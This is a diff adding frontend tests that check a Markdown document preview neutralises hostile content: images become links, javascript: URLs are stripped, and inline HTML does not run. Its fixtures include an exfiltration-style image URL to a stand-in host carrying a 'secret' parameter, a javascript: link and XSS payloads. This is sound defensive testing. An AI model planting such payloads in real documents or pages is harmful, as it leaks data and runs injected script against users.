@@ -72,3 +72,43 @@ describe("simple document previews", () => {
     expect(screen.getByText("42")).toBeTruthy()
   })
 })
+
+describe("a Markdown file", () => {
+  it("shows an image as a link, so a file an agent wrote cannot fetch from any server", async () => {
+    serve(
+      "![tracker](https://evil.example/pixel.png?d=secret)\n\n[docs](https://example.com/docs) and [bad](javascript:alert(1))"
+    )
+    const view = render(
+      <DocumentPreview
+        url="/plan.md"
+        name="plan.md"
+        contentType="text/markdown"
+      />
+    )
+    const image = await screen.findByRole("link", { name: "tracker" })
+    expect(view.container.querySelector("img")).toBeNull()
+    expect(image.getAttribute("href")).toBe(
+      "https://evil.example/pixel.png?d=secret"
+    )
+    // The same links chat has: a new tab that is told nothing about the app.
+    const docs = screen.getByRole("link", { name: "docs" })
+    expect(docs.getAttribute("target")).toBe("_blank")
+    expect(docs.getAttribute("rel")).toBe("noopener noreferrer")
+    // A link with an unsafe protocol loses its address.
+    const bad = screen.getByText("bad").closest("a")
+    expect(bad?.getAttribute("href") ?? "").not.toContain("javascript")
+  })
+
+  it("does not run HTML in it", async () => {
+    serve("Hello <img src=x onerror=alert(1)> <script>alert(2)</script>")
+    const view = render(
+      <DocumentPreview
+        url="/plan.md"
+        name="plan.md"
+        contentType="text/markdown"
+      />
+    )
+    await screen.findByText(/Hello/)
+    expect(view.container.querySelector("img, script")).toBeNull()
+  })
+})
